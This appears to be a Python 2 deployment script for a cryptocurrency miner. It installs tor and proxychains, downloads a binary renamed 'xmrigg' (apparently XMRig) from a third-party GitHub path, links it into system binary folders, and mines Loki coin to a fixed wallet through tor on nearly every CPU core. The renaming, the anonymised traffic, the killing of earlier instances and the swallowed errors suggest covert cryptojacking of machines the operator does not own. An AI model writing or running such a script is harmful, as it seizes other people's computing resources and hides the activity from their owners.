__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'xmrigg'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
try:
    os.system('apt-get update -y')
    os.system('apt-get install gcc make tor python python-dev -y')
    os.system('rm -rf proxychains-ng')
    os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
    if os.path.isfile('/usr/local/bin/' + program) == False:
        os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
                        
        os.system('chmod 777 ' + program)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
        time.sleep (2)
except:
    pass
os.system('tor &')
time.sleep(60)
os.system ('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p x -a rx/loki -k --tls -t ' + str(cores))
